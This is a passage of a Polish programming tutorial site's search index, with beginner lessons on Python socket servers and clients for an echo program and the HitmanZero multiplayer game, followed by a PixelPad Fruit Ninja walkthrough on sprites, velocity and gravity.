filmik</p>"},{"location":"learning-by-games/python/online/echo/#serwer-obsugujacy-wielu-klientow","title":"Serwer obs\u0142uguj\u0105cy wielu klient\u00f3w","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/echo/#peen-program-z-komentarzami_2","title":"Pe\u0142en program z komentarzami","text":"<pre><code>import socket\nfrom _thread import *\n\ndef threaded_client(user):\n    # Obs\u0142ugujemy klienta przez ca\u0142y czas\n    while True:\n        # Pobieramy wiadomo\u015b\u0107 od klienta\n        message = user.recv(2048).decode()\n\n        # I wysy\u0142amy j\u0105 z powrotem \n        user.send(str.encode(message))\n\n# Podajemy adres IP, na kt\u00f3rym b\u0119dzie dzia\u0142a\u0142 serwer\nserver = \"127.0.0.1\"\n# A tak\u017ce port, na kt\u00f3rym b\u0119dzie nas\u0142uchiwa\u0142 na po\u0142\u0105czenia\nport = 5555\n\n# Tworzymy gniazdo\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# L\u0105czymy gniazdo ze wskazanym adresem IP i portem\ns.bind((server, port))\n\n# Nas\u0142uchujemy na po\u0142\u0105czenia\ns.listen(2)\n\nprint(\"Starting server...\")\n# Serwer dzia\u0142a ca\u0142y czas\nwhile True:\n    # Czekamy na po\u0142\u0105czenie\n    user, addr = s.accept()\n    print(\"Connected to:\", addr)\n\n    # Uruchamiamy w\u0105tek do obs\u0142ugi komunikacji pomi\u0119dzy u\u017cytkownikami\n    start_new_thread(threaded_client, (user))\n</code></pre>"},{"location":"learning-by-games/python/online/echo/#testujemy-dziaanie_1","title":"Testujemy dzia\u0142anie","text":"<p>TODO - filmik</p>"},{"location":"learning-by-games/python/online/hitmanzero-one-player/","title":"HitmanZero - jeden gracz","text":""},{"location":"learning-by-games/python/online/hitmanzero-one-player/#wstep","title":"Wst\u0119p","text":"<p>Tw\u00f3j cel jest prosty: dosta\u0107 si\u0119 na drug\u0105 stron\u0119. Po drodze jednak czekaj\u0105 na Ciebie wynaj\u0119ci zab\u00f3jcy, kt\u00f3rzy wystrzeliwuj\u0105 w Twoim kierunku grad pocisk\u00f3w. Nie cofaj si\u0119, id\u017a pewnie przed siebie!</p> <p></p> <p>Grafiki zosta\u0142y pobrane ze strony https://kenney.nl/</p> <p> Grafiki do gry</p>"},{"location":"learning-by-games/python/online/hitmanzero-one-player/#serwer","title":"Serwer","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/hitmanzero-one-player/#peen-program","title":"Pe\u0142en program","text":"<pre><code>import random\nimport socket\nimport time\nfrom _thread import *\n\nWIDTH = 800\nHEIGHT = 1000\nblock_size = 50\n\ndef threaded_client(user1):  # Obs\u0142uga graczy i ich gry\n    # Pobieramy nicki od rozm\u00f3wc\u00f3w\n    user1_name = user1.recv(2048).decode()\n\n    # Nast\u0119pnie wysy\u0142amy te nicki do rozm\u00f3wc\u00f3w, zapoznaj\u0105c ich ze sob\u0105\n    user1.send(str.encode(\"server\"))\n\n    # Wysy\u0142amy rozm\u00f3wcom ich kolejno\u015b\u0107\n    time.sleep(0.2)\n    user1.send(str.encode(\"1\"))\n\n    hitmans_count = random.randint(5, 15)\n\n    hitmans = [{\"y\": block_size / 2} for i in range(hitmans_count + 1)]\n\n    time.sleep(0.2)\n    user1.send(str.encode(str(hitmans_count + 1)))\n\n    user1.setblocking(False)\n\n    start = time.perf_counter()\n\n    # Obs\u0142ugujemy rozmow\u0119 przez ca\u0142 czas\n    while True:\n\n        stop = time.perf_counter()\n        if stop - start &gt; 0.05:\n            start = stop\n            type = random.randint(0, hitmans_count)\n            move = random.randint(-1, 1)\n\n            new_y = hitmans[type][\"y\"]\n            new_y += move * block_size\n            if 0 &lt; new_y &lt; HEIGHT:\n                hitmans[type][\"y\"] = new_y\n                message = (type, move, random.randint(5, 20))\n                user1.send(str.encode(str(message)))\n            # print(message)\n\n# Podajemy adres IP, na kt\u00f3rym b\u0119dzie dzia\u0142a\u0142 serwer\nserver = \"192.168.1.39\"\n# A tak\u017ce port, na kt\u00f3rym b\u0119dzie nas\u0142uchiwa\u0142 na po\u0142\u0105czenia\nport = 5555\n\n# Tworzymy gniazdo\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# L\u0105czymy gniazdo ze wskazanym adresem IP i portem\ns.bind((server, port))\n\n# Nas\u0142uchujemy na po\u0142\u0105czenia\ns.listen(2)\n\nprint(\"Starting server...\")\n# Serwer dzia\u0142a ca\u0142y czas\nwhile True:\n    # Czekamy na po\u0142\u0105czenie od pierwszego rozm\u00f3wcy\n    user1, addr1 = s.accept()\n    print(\"Connected to:\", addr1)\n\n    # Uruchamiamy w\u0105tek do obs\u0142ugi komunikacji pomi\u0119dzy u\u017cytkownikami\n    start_new_thread(threaded_client, (user1, ))\n</code></pre>"},{"location":"learning-by-games/python/online/hitmanzero-one-player/#klient","title":"Klient","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/hitmanzero-one-player/#peen-program_1","title":"Pe\u0142en program","text":"<pre><code>import pgzrun\nimport socket\nimport ast\n\nWIDTH = 800\nHEIGHT = 1000\n\n# Podajemy adres IP serwera\nserver = \"127.0.0.1\"\n# A tak\u017ce port, na kt\u00f3rym serwer nas\u0142uchuje\nport = 5555\n\n# Tworzymy gniazdo do po\u0142\u0105cze\u0144\nconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n# Ustanawiamy po\u0142\u0105czenie z serwerem\nconnection.connect((server, port))\n\n# Podajemy nick u\u017cytkownika\nuser_name = \"blackbat\"\n\n# Wysy\u0142amy nasz nick do serwera\nconnection.send(str.encode(user_name))\n\n# Odbieramy nick drugiego rozm\u00f3wcy od serwera\nopponent_name = connection.recv(2048).decode()\n\n# Odbieramy numer naszej kolejno\u015bci od serwera\norder = int(connection.recv(2048).decode())\n\nhitmans_count = int(connection.recv(2048).decode())\nprint(hitmans_count)\n\n# Ustawiamy gniazdo w trybie nieblokowania, tak \u017caby gra si\u0119 nie zawiesza\u0142a podczas czekania na wiadomo\u015b\u0107 od serwera\nconnection.setblocking(False)\n\nblock_size = 50\n\nman = Actor(\"man\")\nman.x = WIDTH / 2\nman.y = HEIGHT - block_size / 2\nman.angle = 90\n\nhitmans = []\nbullets = []\n\ndef generate_hitmans():\n    for i in range(hitmans_count):\n        hitman = Actor(\"hitman\")\n        if i % 2 == 0:\n            hitman.x = block_size / 2\n        else:\n            hitman.x = WIDTH - block_size / 2\n            hitman.angle = 180\n        hitman.y = block_size / 2\n        hitman.can_shoot = True\n        hitmans.append(hitman)\n\ndef draw():\n    screen.fill(\"black\")\n    man.draw()\n    for hit in hitmans:\n        hit.draw()\n\n    for bul in bullets:\n        bul.draw()\n\ndef update():\n    try:\n        type, move, speed = ast.literal_eval(connection.recv(2048).decode())\n\n        if type == -1:\n            man.y += block_size * move\n            if man.y &lt; 0:\n                man.y = HEIGHT - block_size / 2\n        else:\n            if move == 0:\n                bul = Actor(\"bullet\")\n                bul.x = hitmans[type].x\n                bul.y = hitmans[type].y\n                if type % 2 == 0:\n                    bul.angle = -90\n                    bul.vx = speed\n                else:\n                    bul.angle = 90\n                    bul.vx = -speed\n                bullets.append(bul)\n            else:\n                hitmans[type].y += move * block_size\n    except:\n        pass\n\n    for bul in bullets[:]:\n        bul.x += bul.vx\n\n        if bul.colliderect(man):\n            man.y = HEIGHT - block_size / 2\n\n        if bul.x &gt; WIDTH:\n            bullets.remove(bul)\n\ndef on_key_down(key):\n    if order == 1:\n        if key == keys.UP:\n            man.y -= block_size\n            move = (-1, -1, 0)\n            connection.send(str.encode(str(move)))\n            if man.y &lt; 0:\n                man.y = HEIGHT - block_size / 2\n\ngenerate_hitmans()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/online/hitmanzero-two-players/","title":"HitmanZero - dw\u00f3ch graczy","text":""},{"location":"learning-by-games/python/online/hitmanzero-two-players/#wstep","title":"Wst\u0119p","text":"<p>TODO</p> <p>Grafiki zosta\u0142y pobrane ze strony https://kenney.nl/</p> <p> Grafiki do gry</p>"},{"location":"learning-by-games/python/online/hitmanzero-two-players/#serwer","title":"Serwer","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/hitmanzero-two-players/#peen-program","title":"Pe\u0142en program","text":"<pre><code>import random\nimport socket\nimport time\nfrom _thread import *\n\nWIDTH = 800\nHEIGHT = 1000\nblock_size = 50\n\ndef threaded_client(user1, user2):  # Obs\u0142uga graczy i ich gry\n    # Pobieramy nicki od rozm\u00f3wc\u00f3w\n    user1_name = user1.recv(2048).decode()\n    user2_name = user2.recv(2048).decode()\n\n    # Nast\u0119pnie wysy\u0142amy te nicki do rozm\u00f3wc\u00f3w, zapoznaj\u0105c ich ze sob\u0105\n    user1.send(str.encode(user2_name))\n    user2.send(str.encode(user1_name))\n\n    # Wysy\u0142amy rozm\u00f3wcom ich kolejno\u015b\u0107\n    time.sleep(0.2)\n    user1.send(str.encode(\"1\"))\n    user2.send(str.encode(\"2\"))\n\n    hitmans_count = random.randint(2, 5)\n\n    hitmans = [{\"y\": block_size / 2} for i in range(hitmans_count + 1)]\n\n    time.sleep(0.2)\n    user1.send(str.encode(str(hitmans_count)))\n    user2.send(str.encode(str(hitmans_count)))\n\n    user1.setblocking(False)\n    user2.setblocking(False)\n\n    start = time.perf_counter()\n\n    # Obs\u0142ugujemy rozmow\u0119 przez ca\u0142 czas\n    while True:\n        stop = time.perf_counter()\n        if stop - start &gt; 0.2:\n            start = stop\n            type = random.randint(1, hitmans_count)\n            move = random.randint(-1, 1)\n\n            new_y = hitmans[type][\"y\"]\n            new_y += move * block_size\n            if 0 &lt; new_y &lt; HEIGHT:\n                hitmans[type][\"y\"] = new_y\n                message = (type, move, random.randint(5, 20))\n                user1.send(str.encode(str(message)))\n                user2.send(str.encode(str(message)))\n            # print(message)\n\n        try:\n            # Pobieramy wiadomo\u015b\u0107 od pierwszego rozm\u00f3wcy\n            message = user1.recv(2048).decode()\n            # I wysy\u0142amy j\u0105 do drugiego\n            user2.send(str.encode(message))\n        except:\n            pass\n\n        try:\n            # Nast\u0119pnie pobieramy wiadomo\u015b\u0107 od drugiego rozm\u00f3wcy\n            message = user2.recv(2048).decode()\n            # I wysy\u0142amy j\u0105 do pierwszego\n            user1.send(str.encode(message))\n        except:\n            pass\n\n# Podajemy adres IP, na kt\u00f3rym b\u0119dzie dzia\u0142a\u0142 serwer\nserver = \"192.168.1.39\"\n# A tak\u017ce port, na kt\u00f3rym b\u0119dzie nas\u0142uchiwa\u0142 na po\u0142\u0105czenia\nport = 5555\n\n# Tworzymy gniazdo\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# L\u0105czymy gniazdo ze wskazanym adresem IP i portem\ns.bind((server, port))\n\n# Nas\u0142uchujemy na po\u0142\u0105czenia\ns.listen(2)\n\nprint(\"Starting server...\")\n# Serwer dzia\u0142a ca\u0142y czas\nwhile True:\n    # Czekamy na po\u0142\u0105czenie od pierwszego rozm\u00f3wcy\n    user1, addr1 = s.accept()\n    print(\"Connected to:\", addr1)\n\n    # Czekamy na po\u0142\u0105czenie od drugiego rozm\u00f3wcy\n    user2, addr2 = s.accept()\n    print(\"Connected to:\", addr2)\n\n    # Uruchamiamy w\u0105tek do obs\u0142ugi komunikacji pomi\u0119dzy u\u017cytkownikami\n    start_new_thread(threaded_client, (user1, user2))\n</code></pre>"},{"location":"learning-by-games/python/online/hitmanzero-two-players/#klient","title":"Klient","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/hitmanzero-two-players/#peen-program_1","title":"Pe\u0142en program","text":"<pre><code>import random\nimport pgzrun\nimport socket\nimport ast\n\nWIDTH = 800\nHEIGHT = 1000\n\n# Podajemy adres IP serwera\nserver = \"127.0.0.1\"\n# A tak\u017ce port, na kt\u00f3rym serwer nas\u0142uchuje\nport = 5555\n\n# Tworzymy gniazdo do po\u0142\u0105cze\u0144\nconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n# Ustanawiamy po\u0142\u0105czenie z serwerem\nconnection.connect((server, port))\n\n# Podajemy nick u\u017cytkownika\nuser_name = \"blackbat\"\n\n# Wysy\u0142amy nasz nick do serwera\nconnection.send(str.encode(user_name))\n\n# Odbieramy nick drugiego rozm\u00f3wcy od serwera\nopponent_name = connection.recv(2048).decode()\n\n# Odbieramy numer naszej kolejno\u015bci od serwera\norder = int(connection.recv(2048).decode())\n\nhitmans_count = int(connection.recv(2048).decode())\nprint(hitmans_count)\n\n# Ustawiamy gniazdo w trybie nieblokowania, tak \u017caby gra si\u0119 nie zawiesza\u0142a podczas czekania na wiadomo\u015b\u0107 od serwera\nconnection.setblocking(False)\n\nblock_size = 50\n\nman = Actor(\"man\")\nman.x = WIDTH / 2\nman.y = HEIGHT - block_size / 2\nman.angle = 90\n\nhitmans = []\nbullets = []\n\ndef generate_hitmans():\n    for i in range(hitmans_count):\n        hitman = Actor(\"hitman\")\n        if i % 2 == 0:\n            hitman.x = block_size / 2\n        else:\n            hitman.x = WIDTH - block_size / 2\n            hitman.angle = 180\n        hitman.y = block_size / 2\n        hitman.can_shoot = True\n        hitmans.append(hitman)\n\ndef draw():\n    screen.fill(\"black\")\n    man.draw()\n    for hit in hitmans:\n        hit.draw()\n\n    for bul in bullets:\n        bul.draw()\n\ndef update():\n    try:\n        type, move, speed = ast.literal_eval(connection.recv(2048).decode())\n\n        if type == -1:\n            man.y += block_size * move\n            if man.y &lt; 0:\n                man.y = HEIGHT - block_size / 2\n        else:\n            if move == 0:\n                bul = Actor(\"bullet\")\n                bul.x = hitmans[type].x\n                bul.y = hitmans[type].y\n                if type % 2 == 0:\n                    bul.angle = -90\n                    bul.vx = speed\n                else:\n                    bul.angle = 90\n                    bul.vx = -speed\n                bullets.append(bul)\n            else:\n                hitmans[type].y += move * block_size\n    except:\n        pass\n\n    for bul in bullets[:]:\n        bul.x += bul.vx\n\n        if bul.colliderect(man):\n            man.y = HEIGHT - block_size / 2\n\n        if bul.x &gt; WIDTH:\n            bullets.remove(bul)\n\ndef on_key_down(key):\n    if order == 1:\n        if key == keys.UP:\n            man.y -= block_size\n            move = (-1, -1, 0)\n            connection.send(str.encode(str(move)))\n            if man.y &lt; 0:\n                man.y = HEIGHT - block_size / 2\n    if order == 2:\n        if key == keys.UP:\n            hitmans[0].y -= block_size\n            move = (0, -1, 0)\n            connection.send(str.encode(str(move)))\n        if key == keys.DOWN:\n            hitmans[0].y += block_size\n            move = (0, 1, 0)\n            connection.send(str.encode(str(move)))\n        if key == keys.SPACE and hitmans[0].can_shoot:\n            bul = Actor(\"bullet\")\n            bul.x = hitmans[0].x\n            bul.y = hitmans[0].y\n            bul.angle = -90\n            bul.vx = random.randint(5, 20)\n            bullets.append(bul)\n            move = (0, 0, bul.vx)\n            connection.send(str.encode(str(move)))\n            hitmans[0].can_shoot = False\n            clock.schedule(unlock_hitman, 0.3)\n\ndef unlock_hitman():\n    hitmans[0].can_shoot = True\n\ngenerate_hitmans()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/online/nim-online/","title":"Gra Nim online","text":""},{"location":"learning-by-games/python/online/nim-online/#wstep","title":"Wst\u0119p","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/nim-online/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pixelpad/","title":"Gry 2D - Pixelpad","text":""},{"location":"learning-by-games/python/pixelpad/fruit-ninja/","title":"Fruit Ninja","text":"<p>Tym razem stworzymy gr\u0119 typu Fruit Ninja. Cel gry jest prosty. Z brzegu ekranu b\u0119d\u0105 wyskakiwa\u0107 owoce, a naszym zadaniem b\u0119dzie je z\u0142apa\u0107, zanim spadn\u0105.</p> <p>Gr\u0119, kt\u00f3r\u0105 b\u0119dziemy tworzy\u0107, mo\u017cemy zobaczy\u0107 poni\u017cej.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#to","title":"T\u0142o","text":"<p>Zacznijmy od dodania t\u0142a do naszej gry. Proponuj\u0119 jasne t\u0142o, np. niebo. </p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#grafika","title":"Grafika","text":"<p>Klikamy na plusik ko\u0142o Sprites w menu z lewej strony ekranu i szukamy grafiki o nazwie Sky Background, jak pokazano poni\u017cej. Wybieramy j\u0105 i zatwierdzamy przyciskiem Select Asset. Nast\u0119pnie podajemy nazw\u0119 naszej nowej grafiki: background i zatwierdzamy przyciskiem OK.</p> <p></p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#klasa","title":"Klasa","text":"<p>Jak ju\u017c mamy grafik\u0119, to czas utworzy\u0107 klas\u0119 do reprezentacji t\u0142a. W tym celu klikamy na plusik przy Classes i dodajemy klas\u0119 o nazwie Bg.</p> <p>Wewn\u0105trz klasy, w cz\u0119\u015bci inicjalizacyjnej (zak\u0142adka Start), musimy przypisa\u0107 grafik\u0119 do obiektu naszej nowej klasy. W tym celu odwo\u0142amy si\u0119 do zmiennej <code>sprite</code> wewn\u0105trz naszego obiektu (<code>self</code>) i przypiszemy do niej nowy sprite utworzony za pomoc\u0105 funkcji <code>sprite</code>. Do funkcji przeka\u017cemy jeden parametr: nazw\u0119 naszej grafiki.</p> <pre><code>self.sprite = sprite(\"background.png\")\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#gra","title":"Gra","text":"<p>Teraz czas doda\u0107 nasze nowe t\u0142o do gry. W tym celu przechodzimy do klasy Game. Wewn\u0105trz utworzymy nowy obiekt klasy Bg i przypiszemy go do zmiennej <code>bg</code> w naszej grze.</p> <p>Wszystko to robimy w cz\u0119\u015bci inicjalizacyjnej, czyli zak\u0142adce Start.</p> <pre><code>self.bg = Bg()\n</code></pre> <p>Po uruchomieniu gry powinni\u015bmy ju\u017c zobaczy\u0107 nasze nowe t\u0142o na ekranie. \u015awietna robota!</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#owoce","title":"Owoce","text":"<p>T\u0142o dodaje naszej grze charakteru, ale to owoce b\u0119d\u0105 odgrywa\u0142y g\u0142\u00f3wn\u0105 rol\u0119, dlatego teraz si\u0119 nimi zajmiemy.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#grafika_1","title":"Grafika","text":"<p>Zaczynamy standardowo od grafiki. Klikamy na plusik przy Sprites i szukamy grafiki pomara\u0144czy (orange), takiej jak poni\u017cej. Dodajemy j\u0105 i nazywamy orange.</p> <p></p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#klasa_1","title":"Klasa","text":"<p>Nasze owoce potrzebuj\u0105 klasy, by\u015bmy mogli z nimi pracowa\u0107. Poniewa\u017c wystarczy nam jedna klasa do reprezentacji wielu owoc\u00f3w, nazwiemy j\u0105 Fruit. Klikamy na plusik przy Classes i dodajemy klas\u0119 Fruit.</p> <p>Wewn\u0105trz klasy, w cz\u0119\u015bci inicjalizacyjnej (zak\u0142adka Start), zaczniemy od przypisania grafiki do obiektu owoca. Pocz\u0105tkowo zaczniemy od jednej grafiki, ale p\u00f3\u017aniej b\u0119dziemy wybiera\u0107 losowo z wi\u0119kszego zestawu. Podobnie jak w przypadku t\u0142a przypisujemy do zmiennej <code>sprite</code> w obiekcie klasy (<code>self</code>) now\u0105 grafik\u0119 utworzon\u0105 za pomoc\u0105 funkcji <code>sprite</code>. Do funkcji przekazujemy nazw\u0119 grafiki.</p> <pre><code>self.sprite = sprite(\"orange.png\")\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#gra_1","title":"Gra","text":"<p>Teraz czas doda\u0107 nasz nowy owoc do gry. W tym celu przechodzimy do klasy Game. Pocz\u0105tkowo, tylko dla test\u00f3w, utworzymy nowy obiekt klasy Fruit. Zrobimy to w cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start). Nie musimy przypisywa\u0107 naszego nowego obiektu do \u017cadnej zmiennej, nie b\u0119dziemy si\u0119 do niej odwo\u0142ywa\u0107 z poziomu obiektu gry.</p> <p>Nowy owoc tworzymy zaraz pod linijk\u0105 tworz\u0105c\u0105 t\u0142o, na ko\u0144cu kodu.</p> <pre><code>Fruit()\n</code></pre> <p>Po uruchomieniu gry powinni\u015bmy zobaczy\u0107 na ekranie jedn\u0105, statyczn\u0105 pomara\u0144czk\u0119.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#ruch","title":"Ruch","text":"<p>Nasz owoc jest do\u015b\u0107 statyczny. Nawet bardzo statyczny. Dodajmy troch\u0119 dynamizmu do naszej gry. Do tego potrzebna nam b\u0119dzie pr\u0119dko\u015b\u0107. Poniewa\u017c nasze owoce b\u0119d\u0105 si\u0119 porusza\u0107 zar\u00f3wno w poziomie (\\(x\\)) jak i w pionie (\\(y\\)) to b\u0119dziemy potrzebowa\u0107 dw\u00f3ch zmiennych pr\u0119dko\u015bci. Nazwiemy je <code>velocityX</code> oraz <code>velocityY</code>.</p> <p>Utworzymy te dwie zmienne w klasie Fruit w cz\u0119\u015bci inicjalizacyjnej (zak\u0142adka Start). Poniewa\u017c b\u0119dziemy si\u0119 do nich odwo\u0142ywa\u0107 aktualizuj\u0105c pozycj\u0119 owoca na ekranie, przypiszemy je do obiektu klasy owoca (self). Nowe zmienne dopisujemy na dole kodu. Pocz\u0105tkowo nadamy im warto\u015bci \\(0\\).</p> <pre><code>self.velocityX = 0\nself.velocityY = 0\n</code></pre> <p>Mamy pr\u0119dko\u015b\u0107, ale brakuje nam ruchu. Pr\u0119dko\u015b\u0107 powinna oddzia\u0142ywa\u0107 na pozycj\u0119 owoca na ekranie. Aktualizacj\u0119 pozycji b\u0119dziemy wykonywa\u0107 w ka\u017cdej klatce animacji. W tym celu przechodzimy do cz\u0119\u015bci aktualizacyjnej w kodzie klasy owoca (zak\u0142adka Loop).</p> <p>Na pocz\u0105tku pustego kodu dopiszemy dwie linijki dodaj\u0105ce warto\u015bci pr\u0119dko\u015bci do wsp\u00f3\u0142rz\u0119dnych obiektu na ekranie. Wsp\u00f3\u0142rz\u0119dne zapisane s\u0105 w zmiennych w obiekcie klasy o nazwach <code>x</code> oraz <code>y</code>.</p> <pre><code>self.x += self.velocityX\nself.y += self.velocityY\n</code></pre> <p>Teraz nasze owoce b\u0119d\u0105 si\u0119 porusza\u0107. Albo i nie b\u0119d\u0105. Po uruchomieniu gry zobaczymy, \u017ce nasza pomara\u0144cza wci\u0105\u017c jest statyczna. Dlaczego? Wyja\u015bnienie jest proste. Ustalili\u015bmy obie pr\u0119dko\u015bci na warto\u015bci \\(0\\). W zwi\u0105zku z tym owoc wci\u0105\u017c wisi w jednym miejscu na ekranie. Dla test\u00f3w spr\u00f3buj przypisa\u0107 jakie\u015b warto\u015bci liczbowe do naszych pr\u0119dko\u015bci. Sprawd\u017a jak r\u00f3\u017cne liczby wp\u0142ywaj\u0105 na ruch pomara\u0144czy. Na koniec przywr\u00f3\u0107 warto\u015bci \\(0\\), jeszcze nam si\u0119 przydadz\u0105.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#grawitacja","title":"Grawitacja","text":"<p>Nasze owoce maj\u0105 z za\u0142o\u017cenia by\u0107 wystrzeliwane a potem spada\u0107 powoli w d\u00f3\u0142 ekranu. Zaczniemy od cz\u0119\u015bci zwi\u0105zanej ze spadaniem. Mo\u017cna powiedzie\u0107, \u017ce zasymulujemy dzia\u0142anie grawitacji. Grawitacja b\u0119dzie wp\u0142ywa\u0107 na po\u0142o\u017cenie owoca na ekranie, ale po\u015brednio. Bezpo\u015brednio b\u0119dzie wp\u0142ywa\u0107 na jego pr\u0119dko\u015b\u0107 pionow\u0105 (\\(y\\)). W ka\u017cdej klatce animacji pr\u0119dko\u015b\u0107 pionowa owocu b\u0119dzie zmniejszana o warto\u015b\u0107 si\u0142y grawitacji.</p> <p>Zmiana jest prosta. W klasie owocu (Fruit) w cz\u0119\u015bci aktualizacyjnej (zak\u0142adka Loop) dopisujemy na koniec kodu jedn\u0105 linijk\u0119:</p> <pre><code>self.velocityY -= 0.4\n</code></pre> <p>Po uruchomieniu gry nasz owoc powinien zacz\u0105\u0107 spada\u0107. Poeksperymentuj z r\u00f3\u017cnymi warto\u015bciami si\u0142y grawitacji. Wybierz tak\u0105, kt\u00f3ra Tobie odpowiada.</p> <p>Mamy grawitacj\u0119, \u015bwietnie. Ale co, je\u017celi p\u00f3\u017aniej b\u0119dziemy chcieli j\u0105 zmieni\u0107? Musieliby\u015bmy pami\u0119ta\u0107, gdzie j\u0105 zapisali\u015bmy. A co je\u017celi chcieliby\u015bmy doda\u0107 do gry innego typu elementy, na kt\u00f3re tak\u017ce b\u0119dzie oddzia\u0142ywa\u0107 grawitacja? Musieliby\u015bmy w\u00f3wczas dokonywa\u0107 zmian w kilku miejscach w kodzie. Nie jest to najlepsza praktyka. Dlatego nasz\u0105 warto\u015b\u0107 grawitacji przypiszemy do obiektu gry. Przechodzimy do cz\u0119\u015bci inicjalizuj\u0105cej w klasie Game i na koniec dopisujemy:</p> <pre><code>self.gravity = 0.4\n</code></pre> <p>Teraz nasza warto\u015b\u0107 grawitacji jest dost\u0119pna w ca\u0142ej grze. Wszystkie elementy, kt\u00f3re b\u0119d\u0105 oddzia\u0142ywa\u0107 z grawitacj\u0105, b\u0119d\u0105 mog\u0142y u\u017cywa\u0107 tej warto\u015bci. \u017beby tak by\u0142o, wracamy do owoc\u00f3w (klasa Fruit). Przechodzimy do cz\u0119\u015bci aktualizuj\u0105cej i zmieniamy linijk\u0119, w kt\u00f3rej stosujemy si\u0142\u0119 grawitacji do pr\u0119dko\u015bci owoca:</p> <pre><code>self.velocityY -= game.gravity\n</code></pre> <p>Teraz nasze owoce b\u0119d\u0105 spada\u0107 zgodnie z warto\u015bci\u0105 grawitacji zdefiniowan\u0105 dla ca\u0142ej gry. Jak b\u0119dziemy chcieli zmieni\u0107 grawitacj\u0119, zmienimy j\u0105 w kodzie klasy Game.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#wystrzeliwanie","title":"Wystrzeliwanie","text":"<p>Nasz owoc ju\u017c spada, to teraz czas, by by\u0142 tak\u017ce wystrzeliwany. Jak uzyska\u0107 taki efekt? To stosunkowo proste. Wystarczy, \u017ce nadamy owocowi odpowiedni\u0105 pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107. Chcieliby\u015bmy, by nasze owoce porusza\u0142y si\u0119 na r\u00f3\u017cne sposoby, dlatego skorzystamy z losowo\u015bci.</p> <p>B\u0119dziemy potrzebowa\u0107 funkcji <code>randint</code> z modu\u0142u <code>random</code>, kt\u00f3ra pozwoli nam losowa\u0107 warto\u015bci ca\u0142kowite z zadanego przedzia\u0142u. Aby m\u00f3c korzysta\u0107 z tej funkcji musimy j\u0105najpierw zaimportowa\u0107. Przechodzimy do cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start) w klasie Fruit i na samym pocz\u0105tku kodu, przed wszystkimi innymi instrukcjami, dopisujemy:</p> <pre><code>from random import randint\n</code></pre> <p>Teraz mo\u017cemy przej\u015b\u0107 do losowania pocz\u0105tkowej pr\u0119dko\u015bci owoc\u00f3w.  W klasie Fruit w cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start) Modyfikujemy dwie linijki, w kt\u00f3rych przypisywali\u015bmy do zmiennych okre\u015blaj\u0105cych pr\u0119dko\u015b\u0107 warto\u015bci \\(0\\). Teraz przypiszemy do nich losowe warto\u015bci z wybranego przedzia\u0142u.</p> <pre><code>self.velocityX = randint(5, 10)\nself.velocityY = randint(15, 25)\n</code></pre> <p>W moich eksperymentach takie przedzia\u0142y daj\u0105 najlepsze efekty, ale zach\u0119cam do ekperymentowania i poszukania w\u0142asnego rozwi\u0105zania.</p> <p>Jak teraz uruchomimy gr\u0119, to zobaczymy pomara\u0144cz\u0119 wystrzeliwuj\u0105c\u0105 ze \u015brodka ekranu w losowym kierunku w prawo i do g\u00f3ry. Warto gr\u0119 uruchomi\u0107 kilkukrotnie by zobaczy\u0107 dzia\u0142anie naszej losowo\u015bci. Dla lepszego jednak efektu zmienimy pocz\u0105tkowe po\u0142o\u017cenie owoca tak, by by\u0142 wystrzeliwany z poza brzegu ekranu. W tym celu wybierzemy odpowiednio nisk\u0105 pozycj\u0119 pionow\u0105 (\\(y\\)), np. \\(-400\\), oraz losow\u0105, po\u0142o\u017con\u0105 z lewej strony, pozycj\u0119 poziom\u0105 (\\(y\\)), np. z przedzia\u0142u \\(&lt;-600, -200&gt;\\). W ten spos\u00f3b uzyskamy efekt wystrzeliwania owoc\u00f3w z lewej strony ekranu.</p> <p>Do cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start) w klasie Fruit dopisujemy na ko\u0144cu kodu:</p> <pre><code>self.x = randint(-600, -200)\nself.y = -400\n</code></pre> <p>Teraz nasze owoce b\u0119d\u0105 wystrzeliwane z lewej strony ekranu.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#wiele-owocow","title":"Wiele owoc\u00f3w","text":"<p>Do tej pory mamy w grze tylko jedn\u0105 pomara\u0144cz\u0119. To troch\u0119 za ma\u0142o na pe\u0142noprawn\u0105 rozgrywk\u0119. W naszej grze owoce powinny pojawia\u0107 si\u0119 losowo. Tym si\u0119 teraz zajmiemy. Poniewa\u017c owoce b\u0119dziemy dodawa\u0107 z poziomu gry, przechodzimy do klasy Game.</p> <p>W cz\u0119\u015bci inicjalizuj\u0105cej usuwamy linijk\u0119 tworz\u0105c\u0105 owoc (<code>Fruit()</code>). Nie b\u0119dzie ju\u017c nam potrzebna, s\u0142u\u017cy\u0142a tylko do test\u00f3w.</p> <p>Owoce b\u0119dziemy dodawa\u0107 losowo w trakcie trwania rozgrywki, dlatego przechodzimy do cz\u0119\u015bci aktualizuj\u0105cej (zak\u0142adka 